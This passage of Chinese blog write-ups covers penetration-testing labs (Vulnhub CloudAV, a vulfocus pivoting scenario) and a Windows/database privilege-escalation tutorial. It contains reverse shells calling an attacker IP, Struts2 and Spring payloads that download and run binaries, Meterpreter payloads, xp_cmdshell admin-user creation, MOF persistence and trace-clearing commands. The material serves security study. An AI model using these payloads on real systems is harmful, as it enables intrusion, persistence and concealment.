&gt; shell.elf开启http服务python3 -m http.server 8000使用wget命令从主机下载shellwget 192.168.44.130:8000/shell.elf设置监听 1234use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.44.130exploit 加权chmod +x shell.elf执行./shell.elf成功反弹至msf查看本机路由run get_local_subnets添加新路由run autoroute -s 172.17.0.2/24 内网主机探测123use auxiliary/scanner/portscan/tcpset rhosts 172.17.0.2/24exploit 发现两台存活主机172.17.0.1172.17.0.2172.17.0.3 设置Socks5代理12use auxiliary/server/socks_proxyexploit 配置proxychains4代理vim /etc/proxychains4.conf在配置好代理之后，可以使用kali的代理工具proxychains4进行内网扫描因为socks5不支持ICMP协议，不能对它使用ping命令，所以使用-Pn 参数proxychains4 nmap -Pn -sT 172.17.0.2 搭建Socks5隧道（proxifier）1.设置代理服务器2.测试连通性失败了，仔细一看，因为proxy checker测试连通性的默认网址是www.google.com，将测试的默认网址更改为www.baidu.com就可以了3.设置代理规则 nmap扫描存活主机不知道为什么一直都在报timeout 为啥我和别人运行结果差距这么大？？？问题不大，先继续假装扫描到了172.17.0.2开放了9200端口，开放了elasticserach服务 漏洞利用使用msf进行elasticsearch的漏洞利用 1234search elasticsearchuse exploit/multi/elasticsearch/search_groovy_scriptset rhosts 172.17.0.2run 成功收到会话ls命令发现目录下存在passwords文件使用md5在线解密后得到密码表 john 3f8184a7343664553fcb5337a3138814 1337hack test 861f194e9d6118f3d942a72be3e51749 1234test admin 670c3bbc209a18dde5446e5e6c1f1d5b 1111pass root b3d34352fc26117979deabdf1b9b6354 1234pass jane 5c158b60ed97c723b673529b8a3cf72b 1234jane ssh尝试登录，发现只有john账号能登陆 权限提升1.查看主机内核版本为linux 3.13，版本较低，尝试寻找下有没有内核漏洞能够提权 1searchsploit linux 3.13 2.查看exp代码发现代码末尾会调用gcc来编译ofs-lib.c文件，因为靶机上没有gcc环境，所以不能在靶机上直接运行。我们可以把ofs-lib.so文件和exp文件一同上传到靶机，改成只是调用文件，编译代码操作我们在kali本地完成,这时代码里的编译文件的代码也就不需要了，删除方框内编译代码即可。 3.先复制一份payload到桌面cp /usr/share/exploitdb/exploits/linux/local/37292.c . 4.注释掉方框内代码，并在本地编译gcc -o exp 37292.c5.查找ofs-lib.so文件，将其复制到同一目录 12find /usr -name ofs-lib.socp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so . 6.python开启http.server服务,靶机远程wget下载生成的exp和ofs-lib.so 123python3 -m http.server 8000wget 192.168.44.130:8000/expwget 192.168.44.130:8000/ofs-lib.so 7.给exp执行权限，执行exp后即可获得root权限发现执行失败，并需要输入密码查看exp文件之后发现，我们要将exp和ofs-lib.so文件下载到tmp目录才可以成功执行8.将两个文件重新移动至&#x2F;tmp目录并执行，成功获得root权限搞定！","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"}]},{"title":"Vulnhub靶场 CloudAV","slug":"BoredHackerBlog-CloudAV","date":"2022-10-09T07:57:41.539Z","updated":"2022-10-09T10:23:46.391Z","comments":true,"path":"2022/10/09/BoredHackerBlog-CloudAV/","link":"","permalink":"http://example.com/2022/10/09/BoredHackerBlog-CloudAV/","excerpt":"","text":"环境192.168.202.128 攻击机 192.168.202.132 靶机 主机发现利用nmap扫描192.168.202.0&#x2F;24网段 扫描到192.168.202.132开放了8080端口 web漏洞发现 要求我们输入验证码，看起来像有注入 用万能密码 1&quot; or 1=1 -- -成功绕过 提示我们进行扫描，此处可能存在命令执行漏洞 输入1;whoami,可以看到成功回显 反弹shell利用bash尝试反弹shell kali开启监听 执行1;echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.202.128/7777 0&gt;&amp;1&#39; |bash 成功反弹 提权发现上级目录下存在update_cloudav为root权限 查看其源代码，我们需要给其一个参数，就能命令执行 执行./update_cloudav &quot; |echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.202.128/7777 0&gt;&amp;1&#39; |bash&quot; linux开启监听8888端口 成功","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"}]},{"title":"vulfocus场景 内网死角","slug":"内网死角","date":"2022-10-08T16:00:00.000Z","updated":"2022-10-18T09:52:22.308Z","comments":true,"path":"2022/10/09/内网死角/","link":"","permalink":"http://example.com/2022/10/09/%E5%86%85%E7%BD%91%E6%AD%BB%E8%A7%92/","excerpt":"","text":"内网死角环境 攻击机：ubuntu服务器 外网入口：123.58.224.8:33067 web渗透访问123.58.224.8:33067 发现靶机上运行了laravel服务，版本为v8.41.0 百度一下历史漏洞，发现该版本有一个远程代码执行漏洞 CVE-2021-3129 一键getshell https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP 利用 python3 laravel-CVE-2021-3129-EXP.py http://123.58.224.8:33067 url后面一定不要加 &#x2F; 成功getshell ps：该脚本上传的webshell需要3.0版本以下的哥斯拉才能连接 使用哥斯拉连接 内网上线msf在msf生成linux后门 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=服务器ip LPORT=7777 -f elf -o shell.elf ms开启监听 12345use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 服务器ipset LPORT 7777exploit 利用webshell执行shell.elf 成功接收到会话 内网横向主机1在该台主机发现多张网卡 123410.0.0.39172.18.0.31192.120.2.91192.120.4.66 添加两条路由 12run autoroute -s 192.120.2.0/24run autoroute -s 192.120.4.0/24 资产探测 12345use auxiliary/scanner/portscan/tcpset rhosts 192.120.4.0/24set ports 22,23,80,8080,3389,445,6379set threads 20run 1234192.120.4.46:8080192.120.4.43:80192.120.4.62:8080192.120.4.66:80 搭建socks5代理1use auxiliary/server/socks_proxy 服务器打开对应端口 proxifier设置代理 访问192.120.4.46:8080，发现tomcat服务v8.5.19 利用漏洞上线msf利用vulmap扫描，发现CVE-2017-12615 哥斯拉生成木马并在木马文件夹下执行 curl -v -X PUT --data-binary @shell.jsp &quot;http://192.120.4.46:8080/shell.jsp/&quot; 连接 msf生成shell.elf msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=2333 -f elf -o shell.elf 开启监听 12345use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 服务器ipset LPORT 2333run 主机2该主机有两张网卡 12192.120.1.73172.18.0.19 添加两条路由 12run autoroute -s 192.120.1.0/24run autoroute -s 172.18.0.0/24 扫描该网段 12345use auxiliary/scanner/portscan/tcpset rhosts 192.120.1.0/24set ports 22,23,80,8080,3389,445,6379set threads 20run 在http://192.120.1.49:8080/发现sturts2 服务 利用S2-059漏洞上线msf设置burp socks 代理 抓包前关闭proxifier代理，使用浏览器代理工具代理，不然会抓不到包 数据包 1skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec(&#x27;curl 服务器ip:1111/1.elf&#x27;).getInputStream()).useDelimiter(&#x27;%5C%5C%5C%5CA&#x27;)%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A&#x27;&#x27;%2C%23res.print(%23str)%2C%23res.close()%0A%7d 1skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec(&#x27;chmod 777 1.elf&#x27;).getInputStream()).useDelimiter(&#x27;%5C%5C%5C%5CA&#x27;)%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A&#x27;&#x27;%2C%23res.print(%23str)%2C%23res.close()%0A%7d 1skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec(&#x27;./she.elf&#x27;).getInputStream()).useDelimiter(&#x27;%5C%5C%5C%5CA&#x27;)%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A&#x27;&#x27;%2C%23res.print(%23str)%2C%23res.close()%0A%7d msf开启监听 12345use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 服务器ipset LPORT 1111run 上线成功 主机3发现新网段 添加路由 run autoroute -s 192.120.3.0&#x2F;24 扫描该网段 12345use auxiliary/scanner/portscan/tcpset rhosts 192.120.3.0/24set ports 22,23,80,8080,3389,445,6379set threads 20run springboot服务 发现漏洞为 CVE-2017-17485 在服务器上创建spel.xml文件 12345678910111213&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg&gt; &lt;array&gt; &lt;value&gt;wget&lt;/value&gt; &lt;value&gt;http://服务器ip:4444/2.elf&lt;/value&gt; &lt;/array&gt; &lt;/constructor-arg&gt; &lt;property name=&quot;any&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; spel1.xml 1234567891011121314&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg&gt; &lt;array&gt; &lt;value&gt;chmod&lt;/value&gt; &lt;value&gt;777&lt;/value&gt; &lt;value&gt;2.elf&lt;/value&gt; &lt;/array&gt; &lt;/constructor-arg&gt; &lt;property name=&quot;any&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; spel2.xml 123456789101112&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg&gt; &lt;array&gt; &lt;value&gt;./2.elf&lt;/value&gt; &lt;/array&gt; &lt;/constructor-arg&gt; &lt;property name=&quot;any&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; poc 12345678910111213141516POST /exploit HTTP/1.1Host: 192.120.3.51:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 131&#123;&quot;param&quot;: [ &quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;, &quot;http://服务器ip:6666/spel.xml&quot;]&#125; msf设置监听 12345use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 服务器ipset LPORT 8888run 成功上线","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"}]},{"title":"权限提升","slug":"提权","date":"2022-10-08T16:00:00.000Z","updated":"2022-10-18T13:36:12.431Z","comments":true,"path":"2022/10/09/提权/","link":"","permalink":"http://example.com/2022/10/09/%E6%8F%90%E6%9D%83/","excerpt":"","text":"Winodws提权系统内核溢出漏洞提权利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。 一般流程：信息收集-&gt;补丁筛选-&gt;利用msf或者特定exp提权-&gt;成功 漏洞扫描工具目的：获取可能存在的漏洞编号 vulmap(windows和Linux都适用，Linux需要Python) 在本机上运行报错 解决方案：用管理员身份打开shell命令行，输入以下命令 1set-executionpolicy remotesigned 缺点：只能在powershell里面使用，对于Web提权，不能使用powershell 半天扫描不出来 感觉不太好用 wes.py 服务器执行systeminfo &gt; 1.txt生成文件 既适用本地环境，也适用web环境。 本机执行命令：python wes.py 1.txt -o vuln7.csv（-o为输出文件） 生成vuln.csv文件，判断可能存在的漏洞 metaspolit的内置模块Local Exploit Suggester 这个模块可以帮助我们识别系统存在哪些漏洞可以被利用，并且为我们提供最合适的exp，通过这个exp我们可以进一步提权。 1use post/multi/recon/local_exploit_suggester 提权利用信息收集所收集到的信息，考虑利用未打的补丁进行提取 主要思路：1.MSF提权（优先）2.网络上搜索特定的EXP MSF提权 1.利用search命令寻找对应漏洞 2.使用相应模块 1use exploit/windows/local/ms14_058_track_popup_menu 3.配置好相应参数，即可运行 AT&amp;SC&amp;PS 命令提权1.at提权（针对win7之前（2008之后）的操作系统） 相关命令： at 21:26 /interactive cmd.exe &#x2F;&#x2F;给系统添加一项作业，在下一分钟后打开 因为使用的虚拟机是windows7,at命令无法以交互方式打开 在任务管理器中打开 右键打开文件位置，运行cmd.exe at /del &#x2F;&#x2F;删除所有计划作业 2.sc提权使用sc命令创建一个syscmd的服务，绑定binPath的路径（以cmd打开）： sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact 开启对应服务 sc start syscmd 这里显示失败，但是弹出窗口选择查看消息，就能看到system权限的cmd 结束后记得删除创建的服务 sc delete syscmd 3.ps提权psexec是windows官方的工具,是为windows提供的第三方工具库 因为该虚拟机是64位的机子，所以选择psexec64 psexec64.exe -accepteula -s -i -d cmd.exe 运行成功后与at提权一样，由任务管理器中找到路径打开 在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除 Access 数据库外，其他数据库基本都存在数据库提权的可能。 单纯用令牌窃取提权需要有一个高一点的权限（administer），如果单纯是一个web权限（iis&#x2F;defaultAPP），应该是无法成功的。 Windows2008&amp;7 令牌窃取提升适用范围：windows2008或win7之前版本 原理：进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。 msfvenom生成木马 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.189.130 LPORT=7777 -f exe -o a.exe 加载incognito模块 use incognito list_tokens -u 窃取令牌 1impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; Windows2003&amp;10 进程注入提升进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在 windows2008 之前操作系统上 1pinjector -l //获取当前计算机运行进程列表 1pinjector -P pid cmd.exe port//进程注入 使用kali监听对应端口，即可获得system权限 烂土豆提权本地提权，只针对本地用户，不能用于域用户。适用于win7、8、10、2008、2012 1.上传MSF马并设置对应监听连接 加载incognito模块 12use incognitolist_tokens -u 如果用户不是管理员权限，则可能执行不成功 上传并执行烂土豆 potato.exe 1execute -cH -f ./potato.exe 就可以进行令牌窃取了 1impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; DLL劫持原理： Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索： 应用程序加载的目录C:\\Windows\\System32C:\\Windows\\SystemC:\\Windows当前工作目录Current Working Directory，CWD在PATH环境变量的目录（先系统后用户） 条件：dll 劫持提权需要特定软件应用的控制权限及启用配合 1.特定软件；2.特定软件的控制权限；3.管理员启动软件 流程：信息收集（服务器上的第三方程序的信息）-进程调试（分析这个程序在运行的时候调用了哪些dll）-制作 dll 并上传(制作后门dll去替换原有的dll)-替换 dll-启动应用后成功 以flashftp为例 运行程序，利用ydark查看加载了哪些dll 加载的dll路径需要为自己能访问到并拥有更改权限的的路径，否则会因为权限不够而无法修改 MSFvenom生成dll后门并上传到对应路径 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.129 LPORT=7777 -f dll -o shell.dll 改为对应文件名 再次运行该应用 msf设置监听 加载incognito模块 use incognito list_tokens -u 窃取令牌 1impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 不带引号服务路径当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。 当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。 路径没有包含在引号中，服务会按照以下顺序依次执行 1234c:\\program.exec:\\program files.exec:\\program files (x86)\\grasssoft\\macro.exec:\\program files (x86)\\grasssoft\\macro expert\\MacroService.exe 如果存在漏洞路径，我们可以将msf木马放到上面的路径下，然后重启机器，此时，反弹回来的shell，则是一个system的shell 查看系统配置错误的路径 1wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot; 使用msf制作一个后门，命名为Program.exe，上传到目标服务器C盘根目录 msf就可以接收到反弹回来的会话 不安全的服务权限1.原理：Windows服务有时被配置为与服务本身或与服务运行的目录相关的弱权限。这可能允许攻击者操纵服务，以便在其启动时执行任意代码，并将权限提升到SYSTEM。 2.利用方法：将服务的 binpath 更改为我们上传的木马文件路径，以便在服务启动时执行恶意代码从而获得system权限。 accesschk.exe工具介绍：accesschk是一个windows系统配置检查工具，用于查看文件、注册表项、服务、进程、内核对象等的有效权限。该工具将有助于识别当前用户是否可以修改某个服务目录中的文件。 由于它是微软官方出品，我们将其上传至靶机，执行不会受到阻碍 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk 1.上传accesschk.exe到靶机 通过冰蝎将accesschk.exe上传至靶机C盘根目录 2.启动accesschk.exe 第一次执行accesschk.exe会跳出一个提示窗口让我们接受许可，我们执行accesschk.exe /accepteula命令绕过以自动接受。 检测服务权限配置：执行命令检测，检测当前用户可以操作的服务项accesschk.exe -uwcqv &quot;Administrators&quot; * 3.上传木马文件 启动msf生成名为shell.exe的木马msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.129 LPORT=7777 -f exe &gt; shell.exe 将木马上传至靶机C盘根目录 msf开启监听 4.更改服务路径指向 从刚刚我们使用accesschk.exe查看到的可以操作的服务项中随意挑选一个，这里我们选择AppReadiness这个服务，改变其binpath为上传的木马文件路径 1sc config &quot;AppReadiness&quot; binpath=&quot;C:\\shell.exe&quot; 5.启动服务，成功获得system权限 启动AppReadinesssc start AppReadiness msf收到会话，查看权限，提权成功 数据库提权信息收集（获取数据库密码）MYSQL1.本地源码如果是phpstudy搭建的框架，一般数据库密码可能存储在网站根目录，可以重点查看带有关键字的配置文件，常见的关键字有sql、data、inc、config、connect、database、common、include等。 2.数据库存储或者备份文件MySQL存储格式及对应内容： data目录下文件夹对应数据库名 文件夹内 表名.myd文件中的内容对应的就是表的内容 mysql用户密码存在mysql数据库的user表中 select host,user,authentication_string from mysql.user; 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B 将获得的md5密文解密即可得到密码 3.暴力破解获取数据库最高权限密码，一般我们使用前两种方法居多，如果前两种方法实在用不了，我们才考虑使用暴力猜解。暴力猜解之前，需要先了解数据库是否支持外联以及如何开启外联 mysql.user字段中host表示哪些用户可以登录数据库 127.0.0.1，会通过TCP&#x2F;IP协议连接，并且只能在本机访问 localhost，localhost不会被解析成IP地址，直接通过UNIXsocket连接 **%**表示允许外联 192.168.202.%表示处于192.168.202C段下的所有用户可以登录 当mysql允许外联时就可以爆破最高权限用户密码 MYsql设置允许外联： 修改mysql的user表，host字段为指定ip即可。如果想任意主机都可以连接，可以使用% 1234update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;;flush privileges;grant all on *.* to admin@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;//新建远程连接账户 （1）超级弱口令爆破工具 （2）MSF auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_login模块 4.UDF提权UDF（Userdefined function）可翻译为用户自定义函数，其为mysql的一个拓展接口，可以为mysql增添一些函数 UDF提取的先决条件 1.知道mysql用户名和密码，并且可以远程登录 2.mysql有写入文件的权限，即secure_file_priv的值为空。 secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。 1）secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出2）当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下3）当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 一、查看mysql写入文件权限 1show global variables like &#x27;%secure%&#x27;;//查看secure_file_priv是否为空 可修改my.ini文件，在mysqld条目下添加 “**secure_file_priv&#x3D;**” 二、上传UDF 的动态链接库文件 动态链接库就是实现共享函数库概念的一种方式，在windows环境下后缀名为.dll，在linux环境下后缀名为.so 。我们要将该文件放在特定的目录中，该文件中包含了执行系统命令的一些函数。 1.Mysql版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。 2.Mysql版本小于5.1：如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\\Winnt\\udf.dll 下。如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\\Windows\\udf.dll 下。 select version(); &#x2F;&#x2F;查看数据库版本 show variables like &quot;%plugin%&quot;; &#x2F;&#x2F;查看plugin位置 select @@version_compile_os, @@version_compile_machine;&#x2F;&#x2F;查看数据库和操作系统位数，选择对应mysql位数的udf.dll 如果plugin文件默认不存在，可通过以下命令建立 1select &#x27;xxx&#x27; into dumpfile &#x27;C:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$INDEX_ALLOCATION&#x27;;//不一定成功，可能权限不够 mysql是32位的，上传32位的dll SQLmap中dll文件位于\\data\\udf\\目录下，选择对应dll，放入extra\\cloak下利用cloak.py解密后上传 1python ./cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll 导入指定目录 1234select hex(load_file(&#x27;C:\\\\Users\\\\jiang\\\\Desktopl\\\\lib_mysqludf_sys.dll&#x27;)) into dumpfile &#x27;C:\\\\phpStudy\\\\MySQL\\\\lib\\\\plugin\\\\lib_mysqludf_sys.dll&#x27;;#这里windows下目录结构要进行转义双写 三、创建自定义函数 1CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;lib_mysqludf_sys.dll&#x27;; 报错，可能版本出问题了，换64位后成功 然后使用命令查看是否新增了sys_eval函数 1select * from mysql.func; 四、执行系统命令 1select sys_eval(&#x27;whoami&#x27;); 5.MOF提权基于 MYSQL 特性的安全问题，成功率低 mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。获得mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一段时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。 利用条件 mysql有读写 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof 的权限 secure-file-priv参数不为null windows server2003 以下才能成功 手动一、创建一个mof文件，命名为useradd.mof,内容如下，将mof上传至任意可读可写目录下 （这里上传到C:\\phpStudy\\WWW） 12345678910111213141516171819202122232425#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) instance of __EventFilter as $EventFilter &#123; EventNamespace = &quot;Root\\\\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user admin Admin@123 /add\\&quot;)&quot;; &#125;; instance of __FilterToConsumerBinding &#123; Consumer = $Consumer; Filter = $EventFilter; &#125;; 二、使用sql语句将mof导入C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录，进而让系统执行我们这个恶意的mof文件 1select load_file(&#x27;C:\\phpStudy\\WWW\\user_add.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;; 报错了，百度也找不到什么好的解决办法 MSF1234567use exploit/windows/mysql/mysql_mofset payload windows/meterpreter/reverse_tcpshow optionsset rhosts 192.168.202.129set username rootset password rootrun 痕迹清除 由于系统会定期重新执行添加用户的命令，所以想清理痕迹得先暂时关闭 winmgmt 服务再删除mof 文件，此时删除用户才有效果。 12345678910# 停止 winmgmt 服务net stop winmgmt# 删除 Repository 文件夹rmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\# 手动删除 mof 文件del C:\\Windows\\system32\\wbem\\mof\\good\\test.mof /F /S# 删除创建的用户net user hacker /delete# 重新启动服务net start winmgmt 6.MSF+启动项提权利用mysql_start_up 进行提权 12345use exploit/windows/mysql/mysql_start_upset rhost 192.168.202.129set username rootset password rootrun MSSQLMSSQL配置： 1.配置身份验证模式 2.允许数据库远程连接 3.防火墙打开1433端口 http://tttang.com/archive/1545/ xp_cmdshell提权存储过程为数据库提供了强大的功能，其类似UDF。在相应的权限下，攻击者可以利用不同的存储过程执行不同的高级功能，如增加MSSQL数据库用户，枚举文件目录等等。而这些系统存储过程中要数xp_cmdshell最强大，通过该存储过程可以在数据库服务器中执行任意系统命令。MSSQL2005,2008等之后版本的MSSQL都分别对系统存储过程做了权限控制以防止被滥用。 前提是必须获取SA用户的密码 首先检查判断xp_cmdshell是否存在： 1select count(*)from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27; ; 返回1是存在的 xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。 未开启时执行命令返回如下 开启xp_cmdshell： 1234EXEC sp_configure &#x27;show advanced options&#x27;,1//允许修改高级参数RECONFIGUREEXEC sp_configure &#x27;xp_cmdshell&#x27;,1 //打开xp_cmdshell扩展RECONFIGURE 关闭xp_cmdshell： 12exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure 提权： 12exec master..xp_cmdshell &#x27;net user test Admin@123 /add&#x27; //添加用户test，密码Admin@123exec master..xp_cmdshell &#x27;net localgroup administrators test add&#x27; //添加test用户到管理员组 在连接成功后在sql命令处执行： 1exec xp_cmdshell &#x27;net user aaa Admin@123 /add &amp;&amp; net localgroup administrators aaa /add&#x27; 同上方提权命令一样 就能成功的创建一个账户aaa并且加到管理员组： 1exec xp_cmdshell &#x27;net user aaa /delete&#x27;//删除aaa用户 sp_oacreate提权xp_cmdshell被删除的时候，考虑使用sp_oacreate 开启： 1234EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE WITH OVERRIDE; EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;RECONFIGURE WITH OVERRIDE; 关闭： 123exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure; 执行命令： 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c whoami &gt;C:\\\\1.txt&#x27; 系统目录下成功生成该文件 提权： 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c &quot;net user test Admin@123 /add&quot;&#x27; 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c &quot;net localgroup administrators test 